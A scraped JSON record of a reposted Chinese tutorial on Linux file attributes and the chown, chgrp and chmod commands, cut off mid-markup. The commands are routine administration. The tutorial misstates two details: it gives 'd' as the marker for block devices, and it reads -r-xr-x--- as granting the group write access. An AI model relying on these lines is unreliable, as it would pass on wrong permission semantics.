href=\"https://coolshell.cn/articles/17416.html\">缓存更新的套路</a></p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113992\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113992votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113992\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 1 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "IT技术,分布式,数据库", "url": "http://blog.jobbole.com/113992/", "url_obj_id": "97dd29d801309a1f0316b5b23e4fbb18"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/1b8322e1daff605d71fc81e724421f17.jpg"], "title": "详解 Linux 文档属性、拥有者、群组、权限、差异", "create_date": "2018/05/22 ·", "praise_num": 1, "fav_num": 4, "comment_num": 0, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://www.cnblogs.com/justmine/p/9053419.html\">无痴迷，不成功</a>   </div><h2 id=\"写在前面\">写在前面</h2>\n<p>我们都知道<code>Linux</code>是一个支持<strong>多用户、多任务</strong>的系统，这也是它最优秀的特性，即可能同时有很多人都在系统上进行工作，所以千万不要<strong>强制关机</strong>，同时，为了保护每个人的隐私和工作环境，针对某一个文档(文件、目录)，<code>Linux</code>系统定义了三种身份，分别是<strong>拥有者(owner)、群组(group)、其他人(others)</strong>，每一种身份又对应三种权限，分别是<strong>可读(readable)、可写(writable)、可执行(excutable)</strong>。</p>\n<h2 id=\"文档属性\">文档属性</h2>\n<p>使用命令<code>ls -al --full-time</code>，或者此命令的简写<code>ll</code>可以查看文件或者目录的所有属性。如下：<br>\n<img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/6eb4e7e09d926ea7adb505db505447d2.png\"><br>\n从上面可以看到，每一行都有7列，分别是：</p>\n<ol>\n<li><strong>第一列</strong><br>\n共10位，第1位表示文档类型，<code>d</code>表示目录，<code>-</code>表示文件，<code>l</code>表示链接文件，<code>d</code>表示可随机存取的设备，如U盘等，<code>c</code>表示一次性读取设备，如鼠标、键盘等。后9位，依次对应三种身份所拥有的权限，身份顺序为：owner、group、others，权限顺序为：readable、writable、excutable。如：<code>-r-xr-x---</code>的含义为<strong>当前文档是一个文件，拥有者可读、可执行，同一个群组下的用户，可读、可写，其他人没有任何权限</strong>。</li>\n<li><strong>第二列</strong><br>\n表示连结数</li>\n<li><strong>第三列</strong><br>\n表示拥有者</li>\n<li><strong>第四列</strong><br>\n表示所属群组</li>\n<li><strong>第五列</strong><br>\n表示文档容量大小，单位字节</li>\n<li><strong>第六列</strong><br>\n表示文档最后修改时间，注意不是文档的创建时间哦</li>\n<li><strong>第七列</strong><br>\n表示文档名称。以点(.)开头的是隐藏文档</li>\n</ol>\n<h2 id=\"变更拥有者owner\">变更拥有者(owner)</h2>\n<h3 id=\"位置\">位置</h3>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa9300e5db932478280\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\netc/passwd</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa9300e5db932478280-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa9300e5db932478280-1\"><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">passwd</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/71aa271ab220cecc626c63674cc660d4.png\"></p>\n<blockquote><p>注意：必须是该位置下已存在的帐号。也就是在<code>/etc/passwd</code>中有记录的拥有者才能改变。</p></blockquote>\n<h3 id=\"语法\">语法</h3>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa9300e5e6508594566\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nchown [-R] [帐号名称] [文件或目录]\r\nchown [-R] [帐号名称]:[群组名称] [文件或目录]</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa9300e5e6508594566-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa9300e5e6508594566-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa9300e5e6508594566-1\"><span class=\"crayon-i\">chown</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">R</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span>帐号名称<span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span>文件或目录<span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa9300e5e6508594566-2\"><span class=\"crayon-i\">chown</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">R</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span>帐号名称<span class=\"crayon-sy\">]</span><span class=\"crayon-o\">:</span><span class=\"crayon-sy\">[</span>群组名称<span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span>文件或目录<span class=\"crayon-sy\">]</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p></p>\n<blockquote><p>备注：此命令也可以顺便变更文档群组，但还是建议使用<strong>chgrp</strong>命令来变更文档群组。</p></blockquote>\n<h4 id=\"选项\">选项</h4>\n<p>-R 递归变更，即连同次目录下的所有文件(夹)都要变更。</p>\n<h3 id=\"用法\">用法</h3>\n<p><code>chown daemon test</code> 变更文件夹<strong>test</strong>账号为<strong>daemon</strong>。<br>\n<img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/fcb43ff3f99e4cc0f24349f91c00a3ee.png\"><br>\n<code>chown daemon:root test</code> 变更文件夹<strong>test</strong>群组为<strong>root</strong>。<br>\n<img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/216562230373eef21e7b964e69fa7fe6.png\"></p>\n<p><code>chown root.users test</code> 变更文件夹账号为<strong>root</strong>，群组为<strong>users</strong><br>\n<img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/469705efe86e04479131eee26983dd11.png\"><br>\n<code>chown .root test</code> 单独变更群组为<strong>root</strong><br>\n<img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/cd23a79ca203ca771e40988d1acc9013.png\"></p>\n<blockquote><p>备注：虽然也可以在拥有者与群组间加小数点(<strong>.</strong>)，但为了避免有的同学命名中带点，故还是建议使用冒号“:”来隔开拥有者与群组，避免误判。</p></blockquote>\n<h2 id=\"变更群组group\">变更群组(group)</h2>\n<h3 id=\"位置-1\">位置</h3>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa9300e5eb484833377\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\netc/group</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa9300e5eb484833377-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa9300e5eb484833377-1\"><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">group</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/ece6b7d40fd616dbb26d3c639a0c5764.png\"></p>\n<blockquote><p>备注：从这里可以查看到所有群组</p></blockquote>\n<h3 id=\"语法-1\">语法</h3>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa9300e5f1807531797\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nchgrp [-options] [群组名] [文档路径]</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa9300e5f1807531797-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa9300e5f1807531797-1\"><span class=\"crayon-i\">chgrp</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">options</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span>群组名<span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span>文档路径<span class=\"crayon-sy\">]</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p></p>\n<blockquote><p>备注：关于<strong>options</strong>，可以通过<code>man chgrp、info chgrp、chgrp --help</code>等命令查询详细用法。</p></blockquote>\n<h3 id=\"用法-1\">用法</h3>\n<p><code>chgrp -R users test</code> 改变<code>test</code>文件夹及其所有子文件(夹)的群组为<code>users</code>。<br>\n<img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/324a71a1e4b3ee4ec38eb3c555c82cf1.png\"></p>\n<blockquote><p>注意：群组名称不在位置内，将会报错<code>invalid group</code>。</p></blockquote>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/e26a356e4af1b5db53ee00817cc16660.png\"></p>\n<h2 id=\"变更权限\">变更权限</h2>\n<p>Linux文档的基本权限就三个，分别是<code>read/write/execute</code>，加上身份<code>owner/group/others</code>也只有九个。权限变更的方式有2种，分别是<strong>符号法</strong>和<strong>数字法</strong>。</p>\n<h3 id=\"符号法\">符号法</h3>\n<p>分别使用u，g，o来代表三种身份，a表示全部身份；分别使用r、w、x表示三种权限；分别使用+、-、=表示操作行为</p>\n<h4 id=\"语法-2\">语法</h4>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa9300e5f6980378726\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nchmod | u g o a | +（加入） -（除去） =（设置） | r w x | 文档路径 </textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa9300e5f6980378726-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa9300e5f6980378726-1\"><span class=\"crayon-v\">chmod</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">u</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">g</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">o</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span>（加入）<span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span>（除去）<span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span>（设置）<span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">r</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">w</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">x</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span>文档路径<span class=\"crayon-h\"> </span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p></p>\n<h3 id=\"设置权限\">设置权限(=)</h3>\n<p>变更目录test的权限为任何人都可读、写、执行。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa9300e5f9116221663\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nchmod u=rwx,g=rwx,o=rwx test \r\n或\r\nchmod ugo=rwx test \r\n或\r\nchmod a=rwx test</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa9300e5f9116221663-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa9300e5f9116221663-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa9300e5f9116221663-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa9300e5f9116221663-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa9300e5f9116221663-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa9300e5f9116221663-1\"><span class=\"crayon-i\">chmod</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">u</span><span class=\"crayon-o\">=</span><span class=\"crayon-v\">rwx</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">g</span><span class=\"crayon-o\">=</span><span class=\"crayon-v\">rwx</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">o</span><span class=\"crayon-o\">=</span><span class=\"crayon-e\">rwx </span><span class=\"crayon-i\">test</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa9300e5f9116221663-2\">或</div><div class=\"crayon-line\" id=\"crayon-5b4aa9300e5f9116221663-3\"><span class=\"crayon-e\">chmod </span><span class=\"crayon-v\">ugo</span><span class=\"crayon-o\">=</span><span class=\"crayon-e\">rwx </span><span class=\"crayon-i\">test</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa9300e5f9116221663-4\">或</div><div class=\"crayon-line\" id=\"crayon-5b4aa9300e5f9116221663-5\"><span class=\"crayon-i\">chmod</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">a</span><span class=\"crayon-o\">=</span><span class=\"crayon-e\">rwx </span><span class=\"crayon-v\">test</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0014 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/5ce9bb78e6d7b8626e226fe43a69040f.png\"></p>\n<h3 id=\"去掉权限-\">去掉权限(-)</h3>\n<p>去掉目录test执行权限</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa9300e5fc751988971\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div 